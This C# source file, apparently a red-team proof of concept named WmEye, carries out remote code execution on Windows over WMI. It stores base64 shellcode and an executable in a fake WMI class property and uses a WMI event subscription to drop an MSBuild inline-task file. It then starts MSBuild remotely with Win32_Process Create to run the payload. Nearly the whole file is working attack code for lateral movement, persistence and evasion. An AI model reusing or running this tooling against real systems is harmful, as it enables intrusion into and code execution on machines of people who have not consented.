/*
 * - Create a Remote WMI Class
 * - Write Shellcode as property value to the Class
 * - Write MSBuild File Content as value to another Class
 * - Win32_Process Create to call powershell -> Reads property and dumps content to BuildConfig.xml
 * - Win32_Process Create to call MSbuild remotely -> XML file is Inline task with Shellcoder loader, fetches shellcode from first class property
 * 
 *  [Author - Pwnisher]
 *  Note: Its just a POC, Not at all safe for real engagements!
 */


using System;
using System.Collections;
using System.Collections.Generic;
using System.Management;
using System.Windows.Forms;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;



namespace WmEye
{
    public class WmEye
    {

        public static void Main(string[] args)
        {

            // Handle CLI Args 

            string hostname = args[0];
            string username = args[1];
            string password = args[2];

            Console.WriteLine("Username {0}", hostname);
            Console.WriteLine("Username {0}", username);
            Console.WriteLine("Username {0}", password);
           

            // unlock this to work!
            
            UploadShellcode(hostname,  username, password);
            ConsumerSeUpload(hostname, username, password);
            ExecuteStageTwo(hostname, username, password);
            
 
            // Scope Cleanup Method

        }

        // Fake WMI Classe and Property to Store Shellcode 

        private static string ShellCodeUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
        private static string ShellCodeUploadTempWMIPropertyName = "Description";

        private static string writePath = "C:\\mttagic.xml";
        private static string msbuildpath = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe ";


        // Function to initiate different scopes based on namespaces and return
        private static string InitiateConnection(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
        {
            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            if (!String.IsNullOrEmpty(user) && !String.IsNullOrEmpty(password))
            {
                options.Username = user;
                options.Password = password;
            }

            if (String.IsNullOrEmpty(wmiNamespace))
            {
                wmiNamespace = "root\\cimv2";
            }

            string fullNamespace;
            if (!String.IsNullOrEmpty(host))
            {
                fullNamespace = String.Format(@"\\{0}\{1}", host, wmiNamespace);
            }
            else
            {
                fullNamespace = String.Format(@"\\.\{0}", wmiNamespace);
            }

            try
            {
                scope = new ManagementScope(fullNamespace, options);
                scope.Connect();
            }
            catch (UnauthorizedAccessException)
            {
                return String.Format("Username: {0} with Password {1} threw an unauthorised exception\n", user, password);
            }
            catch (Exception e)
            {
                return String.Format("[!] WMI connection failed: {0}", e.Message);
            }


            return "";
        }



        public static void Consumertwo(string data, string hostname, string username, string password)
        {

            Console.WriteLine(data);



            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;


            try
            {

                // want a replace filter which executes immediately


                ConnectionOptions options = new ConnectionOptions();



                options.Username = username;
                options.Password = password;


                Console.Write("Reached");
                string wmiNameSpace = "root\\subscription";
                string fullscope =  String.Format(@"\\{0}\{1}", hostname, wmiNameSpace);
                ManagementScope scope = new ManagementScope(fullscope, options);
                scope.Connect();
                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                  "WHERE TargetInstance ISA \"Win32_Process\" " +
                    "AND TargetInstance.Name = \"powershell.exe\"";

                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "demoEventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");

                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("LogFileEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "LogFile";
                myEventConsumer["Filename"] = writePath;
                myEventConsumer["Text"] = data;
                myEventConsumer.Put();

                Console.WriteLine("[*] Event consumer created.");

                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            } // END CATCH

        }



        public static void ConsumerSeUpload(string hostname, string username, string password)
        {

           string uploadFile = "C:\\magic.xml";
            
            if (!File.Exists(uploadFile))
            {
                Console.WriteLine("[-] Specified local file does not exist, not running PS runspace\n");

            }

          string content = File.ReadAllText(uploadFile);


          //  string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);

            Console.WriteLine(content);


            Consumertwo(content, hostname, username, password);

            CleanFilter();


        }


       public static void CleanFilter()
        {

            Console.WriteLine("Remove the Event Filter after File is Written");
      
        // Check if File is written, if yes, remove the filter 
        
        }

        public static void UploadShellcode(string host, string username, string password)
        {


            string className = ShellCodeUploadTempWMIClassName;
            string evilPropertyName = ShellCodeUploadTempWMIPropertyName;

            // MessageBox ShellCode

            string fileDatas = @"MdKyMGSLEotSDItSHItCCItyIIsSgH4MM3XyiccDeDyLV3gBwot6IAHHMe2LNK8BxkWBPkZhdGF18oF+CEV4aXR16Yt6JAHHZossb4t6HAHHi3yv/AHHaHl0ZQFoa2VuQmggQnJvieH+SQsxwFFQ/9c=";


            string fileDatai = @"UFFSU1ZXVVRYZoPk8FBqYFpoY2FsY1RZSCnUZUiLMkiLdhhIi3YQSK1IizBIi34wA1c8i1wXKIt0HyBIAf6LVB8kD7csF41SAq2BPAdXaW5Fde+LdB8cSAH+izSuSAH3mf/XSIPEaFxdX15bWllYww==";
            var scope = new ManagementScope();
            string fileData = @"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAApQxXZbSJ7im0ie4ptInuKC8y1imwie4ptInuKbCJ7iq0qPIpsInuKUmljaG0ie4oAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQRQAAZIYDANo+41IAAAAAAAAAAPAALwELAgcKAAIAAAAEAAAAAAAAABAAAAAQAAAAAEAAAAAAAAAQAAAAAgAABAAAAAAAAAAFAAEAAAAAAABAAAAABAAAAAAAAAMAAIAAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAIIAAAAAEAAAAAIAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAAIAAAAACAAAAACAAAABgAAAAAAAAAAAAAAAAAAQAAAQC5wZGF0YQAADAAAAAAwAAAAAgAAAAgAAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiJVCQQiUwkCEiD7CjoDgAAADPASIPEKMPMzMzMzMzMU1ZXVWpgWmhjYWxjVFlIKdRlSIsySIt2GEiLdhBIrUiLMEiLfjADVzyLXBcoi3QfIEgB/otUHyQPtywXjVICrYE8B1dpbkV174t0HxxIAf6LNK5IAfeZ/9dIg8RoXV9eW8MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ0BAA1CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAGRAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";

            

            string r = InitiateConnection(ref scope, host,username,password,"");

            // We're creating a static WMI class here
            ManagementObject evilClass = new ManagementClass(scope, null, null);
            evilClass["__CLASS"] = className;
            evilClass.Properties.Add(evilPropertyName, CimType.String, false);
            evilClass.Properties[evilPropertyName].Value = fileData.ToString();

            try
            {
                Console.WriteLine("[X] Uploading Shellcode as Evil Property. : {0}", evilPropertyName);
                evilClass.Put();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception during setting the evil property : {0}", ex.Message);
                return;
            }


            Console.WriteLine("[X] ShellCode Property Created");
        }




     

        public static void ExecuteStageTwo(string host, string username, string password)
        {


            var scope = new ManagementScope();
           string r = InitiateConnection(ref scope, host, username, password, "");

            ObjectGetOptions optionons3 = new ObjectGetOptions();
            ManagementPath pather2 = new ManagementPath("Win32_Process");
            ManagementClass classInstance2 = new ManagementClass(scope, pather2, optionons3);
            ManagementBaseObject inParams2 = classInstance2.GetMethodParameters("Create");

            string Command = msbuildpath + writePath;

            inParams2["CommandLine"] = Command;
            Console.WriteLine("[X] Invoking : {0}", Command);

            ManagementBaseObject outParams2 = classInstance2.InvokeMethod("Create", inParams2, null);


        } // Closing StageTwo




    } // class

} //namespace 

